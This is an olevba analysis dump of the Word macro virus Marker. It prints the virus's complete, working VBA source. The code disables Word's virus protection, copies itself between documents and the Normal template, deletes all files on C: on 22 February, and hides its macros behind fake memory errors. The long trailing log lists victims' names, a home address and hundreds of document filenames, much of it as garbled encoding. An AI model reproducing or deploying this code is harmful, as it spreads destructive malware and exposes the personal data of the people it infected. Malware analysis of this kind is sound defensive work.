olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.x-cd90629ebf28276c1747453b17e7203fddb9768c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.x-cd90629ebf28276c1747453b17e7203fddb9768c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 












































' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
Private Sub Document_Close()
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
On Error Resume Next
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
Const from = "Yugoslavia" 'nuthin' to do with the GeNiUs just needed a marker
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
Dim ad, nt As Object
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
Dim rep, x As Integer
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
Dim virusCode, UserAddress, LogData, LogFile As String
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
DocumentInfected = ad.codemodule.Find(from, 1, 1, 10000, 10000)
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
NormalTemplateInfected = nt.codemodule.Find(from, 1, 1, 10000, 10000)
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
Options.VirusProtection = False
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
Options.SaveNormalPrompt = True
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
Delivery:
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
If Day(Now()) = 22 And Month(Now()) = 2 Then
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
Kill "C:\*.*":
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
rep = MsgBox("That's Right", vbOK + vbCritical, "It's Murder")
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
GoTo Delivery
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
End If
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
If (DocumentInfected = True Xor NormalTemplateInfected = True) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
If DocumentInfected = True Then
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
SaveNormalTemplate = NormalTemplate.Saved
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
virusCode = ad.codemodule.Lines(1, ad.codemodule.countoflines)
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
For i = 1 To Len(Application.UserAddress)
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
End If
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
Else
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
UserAddress = UserAddress & Chr(13) & "' "
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
End If
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
Next i
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
LogData = Chr(13) & "' " & Format(Time, "hh:mm:ss AMPM -") & Format(Date, "dddd,d mmm,yyyy") & Chr(13) & "' " & Application.UserName & Chr(13) & "' " & UserAddress & Chr(13) & "' " & Application.ActiveDocument & Chr(13)
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
virusCode = virusCode & LogData
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
nt.codemodule.Deletelines 1, nt.codemodule.countoflines
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
nt.codemodule.AddFromString virusCode
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
With nt.codemodule
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
.replaceline 174, "Sub viewVBcode()" & Chr(13) & Chr(13) & "x=Msgbox(" & Chr(34) & " Error - Not enough memory!" & Chr(34) & ", VbOkonly + VbApplication+Vbcritical," & Chr(34) & "Visual Basic Editor" & Chr(34) & ")" & Chr(13) & Chr(13) & "End Sub" & Chr(13) & Chr(13) & "Sub ToolsMacro()" & Chr(13) & Chr(13) & "x=Msgbox(" & Chr(34) & " Error - Not enough memory!" & Chr(34) & ", VbOkonly + VbApplication+Vbcritical," & Chr(34) & "Visual Basic Editor" & Chr(34) & ")" & Chr(13) & Chr(13) & "End Sub"
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
End With
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
With nt.codemodule
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
For x = 45 To 181 Step 2
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
.replaceline x, "' " & Application.UserName & " " & Application.ActiveDocument & Now & Application.ActivePrinter
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
Next x
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
End With
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
If SaveNormalTemplate = True Then NormalTemplate.Save
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
End If
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
If NormalTemplateInfected = True Then
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
SaveDocument = ActiveDocument.Saved
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
virusCode = nt.codemodule.Lines(1, nt.codemodule.countoflines) & Chr(13) & "' " & Application.ActiveDocument & Chr(13)
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
ad.codemodule.Deletelines 1, ad.codemodule.countoflines
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
ad.codemodule.AddFromString virusCode
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
nt.codemodule.Deletelines 1, nt.codemodule.countoflines
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
nt.codemodule.AddFromString virusCode
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
ad.codemodule.Deletelines 174, 13
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
With ad.codemodule
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
For x = 45 To 181 Step 2
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
.replaceline x, "' " & Application.UserName & " " & Application.ActiveDocument & Now & Application.ActivePrinter
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
Next x
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
End With
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
If SaveDocument = True Then ActiveDocument.Save
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
End If
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
End If
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
Options.SaveNormalPrompt = False
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
End Sub
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
' HANJUNG hsintao(OMRF).doc2000.10.31 їААь 11:39:57\\SV085\pg082 - NE02:
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
' HANJUNG hsintao(OMRF).doc2000.10.31 їААь 11:39:57\\SV085\pg082 - NE02:
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:
' HANJUNG hsintao(OMRF).doc2000.10.31 їААь 11:39:57\\SV085\pg082 - NE02:
' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:

' HANJUNG PRINTING.doc2000.11.06 їАИД 3:39:58\\SV085\pg082 - NE02:

' flres1.doc

' sample1.doc

' Lawton updated resume.doc

' LEMERISE.DOC

' galianes.doc

' CVUK.doc

' word95_BinLi.doc

' Eduard 1.doc

' rakowski.doc

' DHRUVER.DOC

' 01:08:39 PM -Wednesday,16 Jun,1999
' DhruveR
'
' Dhruver.doc

' 6-15.doc

' DJI RESTORE.doc

' 03:58:39 PM -Wednesday,16 Jun,1999
' Tom Dziubek
'
' DJI RESTORE.doc

' FEC Script.doc

' OutlookDelegates.doc

' nite.doc

' sbranc01.doc

' newuser-djxpress.doc

' june_99.doc

' 02:01:37 PM -Monday,28 Jun,1999
' TozziT
'
' june_99.doc

' teammov1.doc

' 03:34:41 PM -Wednesday,7 Jul,1999
' DziubekT
'
' teammov11.doc

' Document2

' oneweek.doc

' oneweek.doc

' Document1

' twoweek.doc

' 4week.doc

' 01:44:35 PM -Wednesday,7 Jul,1999
' Ernesto Dulce
'
' 4week.doc

' FSDLA.doc

' FSDLA.doc

' July 13th Outage Request.doc

' 12:14:22 PM -Monday,12 Jul,1999
' cnsncc
'
' July 13th Outage Request.doc

' Kathy's Resume1.doc

' ubeedoo.doc

' Unregistered Network Numbers.doc

' servernames.doc

' data circuits 1.doc

' DAILY ACTIVITY REPORT.doc

' 09:51:17 AM -Tuesday,13 Jul,1999
' Susie Scornavacca
'
' DAILY ACTIVITY REPORT.doc

' june.doc

' OSDJune1999.doc

' djxprss Request Form1.doc

' Shadow R4.doc

' TOKREPLL.doc

' bypass.doc

' 12:20:36 PM -Tuesday,13 Jul,1999
' Bob Brooks
'
' bypass.doc

' WORD.doc

' UPDSecIDaud21.doc

' UPDSecIDaud21.doc

' 09:14:25 AM -Friday,16 Jul,1999
' Deb Sorchinski
' 20 Academy Street
' Princeton, NJ  98540
' UPDSecIDaud2.doc

' editor~2.doc

' CEO Expectations & Decision Making.doc

' HR Issues.doc

' WINWORD.DOC

' dorrisobrien_bio.doc.doc

' MelConnet_bio.doc.DOC

' Aeneid Position Spec 7-2-99.doc

' orgchart.doc

' top level org chart.doc

' first note.doc

' top level org chart.doc

' Sunesis Group Communications.doc

' first note.doc

' CONTACT LIST DIRECT.doc

' GSReview.doc

' WEEKLY STAFF MEETING-TIM ANDREWS.doc

' Polycom1.doc

' PENDING JV ITEMS_.doc

' WAVO MEETING AGENDA.doc

' 03:08:21 AM -Friday,23 Jul,1999
' Dow Jones Employee
'
' WAVO MEETING AGENDA.doc

' bruce

' Bruce2

' bruce3

' email.doc

' Revised Activities By Role - Working Team.doc

' DJICustomerLetter_American English.DOC

' ppteam.doc

' 12:23:02 PM -Tuesday,27 Jul,1999
' DJIPI - HK
'
' ppteam.doc

' quotation for eve.doc

' Great Note from Tim Andrews (Customer Focus & Leadership).doc

' Tim Andrews Note - 3rd month of JV.doc

' DJRBI Top Level Organizational Chart.doc

' top level org chart.doc

' Chinatrust Agreement.doc

' RBB Proposal.doc

' Sources Available on RBB.doc

' Hospital Authority - successful experience & DJ Technical Contact.doc

' WINWORD.DOC

' RBB Trial Evaluation Letter.doc

' 08:49:41 AM -Thursday,29 Jul,1999
' Warren Tang
'
' RBB Trial Evaluation Letter.doc

' TAcontentexchange.doc

' DJI English Intro.doc

' RBB intro.doc

' Reuters.doc

' Orient.doc

' WINWORD.DOC

' Inform.doc

' Inform.doc

' 11:02:38 ЙПОз -Monday,16 Aug,1999
' Administrator
'
' PW.doc

' Siemens.doc

' Enron China PW.doc

' Document2

' Dow Jones.doc

' Change to the contractLegend.doc

' Legend.docfilename=Legend.doc

' RBB SelectCCTV.doc

' RBB SelectCCTV2.doc

' 05:19:20 PM -Friday,20 Aug,1999
' ws12
'
' RBB_SelectCCTV.doc

' Рыґ«єНѕ­УЄ·ЦАлЈ¬°ґёчЧФ№жВЙФЛЧч.doc

' 0823XMFX.doc

' 0823XXT.doc

' ѕ­јГІїёчАёДї№ъЗмЅЪДїІЯ»®Кй.doc

' РЕПўІЯ»®ЧйИЛФ±№¤ЧК±н.doc

' РЕПўІЯ»®ЧйИЛФ±ј°№¤ЧчЦ°ДЬ.doc

' РЕПўІЯ»®ЧйИЛФ±№¤ЧК±н.doc

' 1ЦЈ  Оµ.doc

' №ШУЪЎ°ЛНїЖјјПВПзЎ±ЅЪДїµДБўПо±Ёёж.doc

' Ў°ЦР»Є·юКООД»ЇХ№µнЎ±ЅЪДїЅ«ФЪ¶юМЧІҐіц.doc

' ёЯУкЛЙ0824.doc

' ЫвЙПРР.doc

' ѕ­јГІїЅЪДї±ЁІҐ±н.doc

' 0825XMFX.doc

' 0826SMFX.doc

' ІОїјСЎМв0826.doc

' НвБЄѕ­·СК№УГ±ёНьВј.doc

' јт    ±Ё.doc

' јт±Ё0325.doc

' ЦРСл¶юМЧѕ­јГІїЅЪДї±ЁІҐµҐ1.doc

' ЅЪДї±д¶ЇНЁЦЄ23.doc

' 0828XMFX.doc

' 990829Ј­2.xls

' 806ЧЁјТІЯ»®»бСЎМв.doc

' 990829Ј­3.xls

' 990829Ј­1.xls

' BTD0828.doc

' RCXX0829.doc

' ІОїјСЎМв0830.doc

' 0829SMFX.doc

' 0830SMFX.doc

' 0830SXT.doc

' 990829Ј­1.xls

' ОДµµ3

' 990829Ј­3.xls

' ЅрНБµШ0829.doc

' Йъ»о0829.doc

' ОДµµ2

' 0829XXT1.doc

' BTD0830.doc

' 05:40:49 PM -Wednesday,1 Sep,1999
' mac03
'
' BTD0901.doc

' 0902SXT.doc

' ІїБмµјЈє.doc

' ±аЗ°ІОїј902A.doc

' 1.doc

' 0901SXT.doc

' 0901XXT.doc

' 0902A.doc

' 990902Ј­1.xls

' 990902Ј­2.xls

' 990902Ј­3.xls

' ЅрНБµШ0902.doc

' Йъ»о0902.doc

' 0902.doc

' 0902XXT.doc

' 0902XMFX.doc

' jky0902.doc

' Ў¶ЦР№ъІЖѕ­±ЁµАЎ·±ЁМвµҐ831.doc

' Йъ»о0901.doc

' ГЅМе¶ФЧЁТµ№«№Ш·юОсµДРиЗу.doc

' НшВзЦРРВОЕСФВЫµДМШµгј°ЖдУРР§їШЦЖіхМЅ.doc

' ЦР№ъИЛГсґуС§РВОЕПµГЅЅйЧЁјТБР±н.doc

' ёЯУкЛЙ0615.doc

' РЕ1.doc

' ёЯУкЛЙ0805.doc

' RCXX0527.doc

' RCXX0609.doc

' 0904XXT.doc

' ЅрНБµШ0901.doc

' ЅрНБµШ0904.doc

' Йъ»о0904.doc

' 0904XMFX.doc

' 0905SXT.doc

' 08:23:59 AM -Saturday,11 Sep,1999
' ws12
'
' 0909SXT.doc

' ЦРСлµзКУМЁѕ­јГІї№ШУЪЎ°µзКУМЁНн»бЅЪДїµчІйЎ±µД»г±Ё.doc

' ЎЇ99Ў¶ІЖё»Ў·И«ЗтВЫМёЎ¤ЙПєЈДк»бМШ±р±ЁµА.doc

' Нф.doc

' Рмѕь·­Тл.doc

' 913.doc

' jkm0913.doc

' ЦЖЖ¬ИЛ»бТйѕ­·СФ¤Лг.doc

' ~$¶ы№«ЛѕЧЬІГ·Г»ЄІЯ»®.doc

' 917.doc

' ±ај­Чй№¤ЧчБчіМёДЅш·Ѕ°ё.doc

' 917.doc

' 917.doc

' 917.doc

' 917.doc

' 917.doc

' 917.doc

' 917.doc

' jky0917.doc

' jkr0917.doc

' jkm0917.doc

' jkf0917.doc

' јЖЛг»ъКАЅз   №ъјК.doc

' ИЛКВґ¦БмµјЈє.doc

' ОДµµ3

' BTD9018.doc

' Internet№«ЛѕїјІмјтјЗ.doc

' 918.doc

' 990918-1.xls

' 990918-3.xls

' ОДµµ2

' єЈНе№ъјТ±нКѕЅ«јМРшЦґРРПЮІъ±ЈјЫХюІЯ.doc

' Т»ЦЬЦШµгСЎМвІОїј920.doc

' jky0916.doc

' jky0914.doc

' УўМШ¶ы№«ЛѕЧЬІГ±ґИрМШІ©Кї·Г»Є±ЁµАІЯ»®·Ѕ°ё.doc

' 920-1.doc

' ОДµµ2

' 919.doc

' Backup of 10ФВЦШµгСЎМв.wbk

' ѕ­јГІї9ФВ·ЭЦЖЖ¬ИЛ»бТйјЗВј.doc

' №ШУЪЎ¶Йъ»оЎ·АёДїёД°жЛјВ·»бТйјЗВј.doc

' БЩК±ИЛФ±АНОс·ў·Е±н.doc

' ОДµµ1

' ОДµµ2

' Ў¶ёцРЎРЎ№ъУРЖуТµµД№ККВЎ·.doc

' ОДµµ1

' Уў№ъµзКУРВОЕЈєёцРФ»ЇЈ¬ЦчІҐј°РВ°ьЧ°.doc

' ґУµзКУЅЪДї°ьЧ°РОКЅ±д»ЇїґµзКУГЅЅйµДёцРФ»ЇЧ·Зу.doc

' ѕ­јГЖµµАµДРОПуј°Рыґ«.doc

' ВЫЖ·ЕЖХЅВФФЪЖµµАѕ­УЄЦРµДЦШТЄЧчУГ0625.doc

' 9027smfx.doc

' №ШУЪТФГА№ъОЄКЧµД±±Фјє·И»єдХЁ.doc

' К®Т»ЖЪјдѕ­јГІїЅЪДїІҐіцµҐ.doc

' К®Т»ЖЪјдЅЪДїІҐіцµҐ.doc

' 0927XMFX.doc

' jkr0927.doc

' 0928SXT.doc

' ОДµµ1

' ОґУкісзС ИОЦШµАФ¶.doc

' ОґУкісзСЈ¬ИОЦШµАФ¶.doc

' ЅрНБµШ0927.doc

' Йъ»о0927.doc

' 04:15:29 PM -Thursday,28 Oct,1999
' 008
'
' life1027.doc

' c1029.doc

' c1101.doc

' 09:27:51 AM -Wednesday,3 Nov,1999
' 008
'
' c1103.doc

' ЗлКѕ±Ёёж.doc

' DSYS.doc

' CAZHDBFW

' Нхµ¤ДгєГЈє.doc

' ОДµµ1

' c1110.doc

' ОДµµ2

' Ў¶К±ЙРЎ·ЅЪДїЛкД©ЖЄСЎМв.doc

' ОеК®Дк»ШншЈЁµзРЕ°жЈ©.doc

' Пы·СµчІйёД°жКЅєуµДСщЖ¬.doc

' 09:19:33 AM -Monday,8 Nov,1999
' yenan
'
' Пы·СµчІйёД°жКЅєуµДСщЖ¬.doc

' ~WRL1293.tmp

' НЁС¶Вј.doc

' јЗКВ±ѕ.doc

' јЖ»®Кй.doc

' УЙУЪµчІйНшВзК№УГјЖЛг»ъВКёЯЈ¬ЗлёчО».doc

' ~WRL0001.tmp

' ~WRL0001.tmp

' ЦР№ъµзКУПы·СµчІйНшВз№¤ЧчјЖ»®Кй.doc

' ЦР№ъµзКУПы·СµчІйНшВз№¤ЧчјЖ»®Кй.doc

' ~WRL0001.tmp

' µШ·ЅМЁёРРЛИ¤µДСЎМв.doc

' ГсєЅ·юОс.doc

' №ШУЪЅьЖЪ№¤ЧчРЎЅб.doc

' 09:34:31 AM -Thursday,16 Nov,2000
' yenan
'
' №ШУЪЅьЖЪ№¤ЧчРЎЅб.doc

' ОДµµ2

' ЙкЗл.doc

' ОДµµ1

' Пы·СµчІйИзєОЧц.doc

' ОДµµ1

' ОДµµ2

' Пы·СЧйИЛФ±ГыµҐ.doc

' Пы·СЧйИЛФ±ГыµҐ 25ИЛ.doc

' ОДµµ1

' Пы·СЧйИЛФ±µДЙъИХ.doc

' ОДµµ2

' Doc1.doc

' tcm.doc

' ОДµµ3

' НвВф·юОс.doc

' КУ±ЈЖБ.doc

' КУ±ЈЖБµчІй±н.doc

' НшВзСРМЦ»б.doc

' 01:16:25 PM -Wednesday,13 Dec,2000
' yenan
'
' НшВзСРМЦ»б.doc

' µзКУМЁ.doc

' ЦР№ъµзКУПы·СµчІйНшіЙФ±МЁБЄПµИЛј°БЄПµ·ЅКЅ.doc

' ЦШЗмµДЕуУСГЗ.doc

' НЁ  ЦЄ.doc

' КУ±ЈЖБ.doc

' №ШУЪґєЅЪМШ±рЅЪДї.doc

' УОП·.doc

' 12:51:04 PM -Sunday,26 Dec,1999
' ljf
'
' УОП·.doc

' µгИэИэРЎЖ·.DOC

' ОДµµ2

' АоЅа·ЗН¬Цѕ»оФѕУЪµ±ґъОДС§СРѕїЅзТСЅь¶юК®ДкЈ¬Т»Ц±КЗёГБмУтДЪґ¦УЪЗ°СШµШґшЎўУµУРіЦѕГУ°ПмБ¦µДЦШТЄµДЧКЙоЕъЖАјТєНС§ХЯЦ®Т».doc

' ¶БК·УР0.doc

' ¶БК·УР1.doc

' ¶БК·УРёР.doc

' ОДµµ2

' єПН¬.doc

' 2000.doc

' єГЙз»б.doc

' Ў°іЗКРК±ґъЎ±ОДС§КйПµ.doc

' Doc4.doc

' ОДµµ2

' ОДµµ2

' ¶ЇМ¬.doc

' Ц°іЖ.doc

' ¶БЎ¶°ЩДкТтФµЎ·УРёР0.doc

' ¶БЎ¶°ЩДкТтФµЎ·УРёР.doc

' ОДµµ1

' ОДµµ1

' ОДµµ1

' ОДµµ1

' ВЮЗїБТЙўОДСЎ.doc

' ВЮЗїБТКЗТ»ёцєГИЛ.doc

' ґєМм.doc

' Б¬ФЖАцКЗТ»ёцєГДёЗЧ.doc

' ОДµµ1

' ВюІЅ¶ј»б»ЄНҐ    Ж·О¶ЅхРеИЛЙъ.doc

' ЦЗДЬЧЎХ¬АлДгУР¶аФ¶.doc

' ОДµµ1

' ЙзЗш№¦ДЬµДЦШТЄРФ.doc

' ЙзЗш№¦ДЬµДЦШТЄРФ.doc

' ОДµµ1

' ОДµµ1

' JG003.doc

' ѕ­УЄЦЗ»Ы.doc

' CMS1.doc

' ОДµµ1

' ±±ѕ©Нн±Ёёе.doc

' ОДµµ1

' ОДµµ1

' ОДµµ2

' ґ«ХжёсКЅ.doc

' ±ЁјЫёсКЅ.doc

' ±ЁјЫёсКЅ.doc

' ОДµµ1

' НшВзОДС§Ѕ±Т»НПФЩНПКВіцУРТт.doc

' ВіСёОКМв.doc

' ѕ«Ж·Х№Мб°ё.doc

' ЗЩЙЄєПГщ К±ЙРЦ®СЎ.doc

' ТБАіїЛЛ№ЎЄЎЄПґТВ»ъАъК·µДКйРґХЯ.doc

' 315ЛНЕЈДМёе.doc

' 315јТµзСЎ№єёЯКЦёе.doc

' јт±ЁёсКЅ.doc

' јт±ЁёсКЅ.doc

' ·ўёеЧЬЅб.doc

' DOC1.DOC

' ОДµµ2

' DOC1.DOC

' DOC1.DOC

' ДёТЗИз·¶.doc

' ±±ѕ©µзКУМЁґєЅЪ.doc

' ПґТВЎ°ёЙѕ»Ў±РВёЕДо.doc

' ѕ©ёЫОпТµПоДїїЄЦ§Зйїц.doc

' РВОЕёе·вГж.doc

' Сф№вУлЙіМІ.doc

' ПаФјНшТЧЗ§мыЗйИЛ.doc

' Сф№вУлЙіМІ.doc

' ПаФјНшТЧЗ§мыЗйИЛ.doc

' ТБАіїЛЛ№И«ГжЅшѕьПґТВ»ъРРТµ.doc

' ±щПд±¬ХЁТэ·ўЦЖАдјБСЎУГЦ®Хщ.doc

' 1ФВАНОс·СГыµҐ.doc

' ОДµµ1

' ѕєХщ¶ФКЦ·ЦОцУлУ¦¶ФІЯВФ.doc

' Ў°ЧўТвБ¦Ў±Ѕ±ёшЛ­.doc

' ДёЗЧ.doc

' ±щПдЎўПґТВ»ъАа1-26.doc

' №¤ЧчЧЬЅбЧЬ·вГж.doc

' БЙЙтНн±Ё»Ш»ч·Ѕ°ё.doc

' 315З±ФЪОЈ»ъФ¤·А.doc

' ОДµµ1

' ОДµµ1

' 3-4ФВГЅЅйјЖ»®.doc

' Ў¶±ѕ±ЁЅсИХіц»чЎ·ЧчХЯГыµҐ.doc

' ОДµµ2

' ОДµµ1

' ОДµµ1

' ОДµµ1

' ОДµµ2

' Ў¶±ѕ±ЁЅсИХіц»чЎ·ЛНКйГыµҐ.doc

' ОДµµ1

' ОДµµ2

' №¤Ччµµ°ё.doc

' AXJLB.DOC

' CH.DOC

' DH.DOC

' NAME.DOC

' WJ.DOC

' WZPB.DOC

' ИэТ»ОеРЎСФВЫ.doc

' ±±ѕ©·їµШІъФУЦѕУГёе.doc

' ОДµµ1

' ОчГЕЧУРВОЕёе2.doc

' ОчГЕЧУРВОЕёе1.doc

' ОДµµ1

' ОДµµ1

' ГчГч°Ч°ЧСЎјТµз.doc

' ОДµµ1

' РВОЕБЄІҐІЙ·Г»Шґр.doc

' ОДµµ1

' ОДµµ1

' ОчГЕЧУРВОЕёе3.doc

' ОДµµ1

' Аб±ИСЄєм.doc

' µзУ°Д§·ЅЎ°°ВЛ№їЁЎ±ФЪРэЧЄ.doc

' ±щПдЎўПґТВ»ъАа2-16.doc

' ОчГЕЧУФЪЦР№ъ.doc

' ОДµµ1

' ОДµµ1

' SBSpublicconsulting.doc

' ѕ«Ж·Х№ИнРВОЕјЖ»®.doc

' РВОЕёе4.doc

' ОДµµ2

' ОДµµ1

' ЧрЦШЗаґє.doc

' ±щПдЎўПґТВ»ъАа2-16.doc

' ±щПдЎўПґТВ»ъАа2-16.doc

' ±щПдТІТЄЧцМејм.doc

' ХыМе¶ФКЦЧКБП.doc

' ±щПдЎўПґТВ»ъАа2-16.doc

' ¶ФКЦЧКБП.doc

' ОДµµ1

' ЧЯіцПхСМµДЕ®Йс.doc

' ±Ёёж.doc

' µ±Е®ИЛФвУцНшВз.doc

' ОДµµ2

' ґ«Хж.doc

' РЎЙсПКРВОЕёе.doc

' Sinch-c(1).doc

' µ±Е®ИЛФвУцНшВз.doc

' »Ш·ГЅб№ыРВОЕёе.doc

' ОчГЕЧУРВОЕёе4.doc

' ОчГЕЧУРВОЕёе5.doc

' 630ѕзіЎёе.doc

' ЦР№ъµзКУТµФНДрРВ»ъУц.doc

' ОДµµ1

' ОДµµ1

' ОДµµ2

' ОДµµ3

' ОДµµ4

' ОДµµ5

' ЦЬ¶шёґКЗІ»КЗЎ°КАјНЦР№ъѕЮМ°Ў±.doc

' ·вГжЙиПл.doc

' ОДµµ1

' ОДµµ1

' Doc1.doc

' ОДµµ1

' ОДµµ1

' ОДµµ1

' ОДµµ1

' ОДµµ1

' СуЖ·ЕЖґтЖрЎ°№ҐРДХЅЎ±.doc

' ОчГЕЧУРВОЕёе6.doc

' µзДФЧКБП.doc

' АПТЇіµРВОЕёе.doc

' ТБАіїЛЛ№ФЪЦР№ъ.doc

' road show--2000ОДЧЦ.doc

' ЅвЛµґК.doc

' ТБАіїЛЛ№АъК·.doc

' ОДµµ1

' ОДµµ1

' ОДµµ1

' ОчГЕЧУРВОЕёе7.doc

' ОДµµ1

' newspaper2.doc

' ОчГЕЧУРВОЕёе8.doc

' №¤Ччµµ°ёЈЁ¶юЈ©.doc

' robot brochure.doc

' ЕДВфК¦.doc

' НјЖ¬¶Ф±ИОДЧЦЛµГч.doc

' АъЅм°ВЛ№їЁГыµҐ.doc

' ЅвЛµґК.doc

' СыЗлєЇ.doc

' СыЗлєЇ.doc

' ёґјю ЅвЛµґК.doc

' ѕ«Ж·Х№РВОЕёе.doc

' ѕ«Ж·Х№РВОЕёе¶ю.doc

' УєХэ»КµЫ.doc

' 09:41:53 AM -Tuesday,30 Mar,1999
' sl
'
' %D3%BA%D5%FD%BB%CA%B5%DB.doc?funcid=readpart&websid=EAGiYwAhG&mid=MX6aBTm174i47-D5EEYS&part=2&filename=%D3%BA%D5%FD%BB%CA%B5%DB

' ОДµµФЪ Microsoft Internet Explorer

' ОДµµФЪ Microsoft Internet Explorer

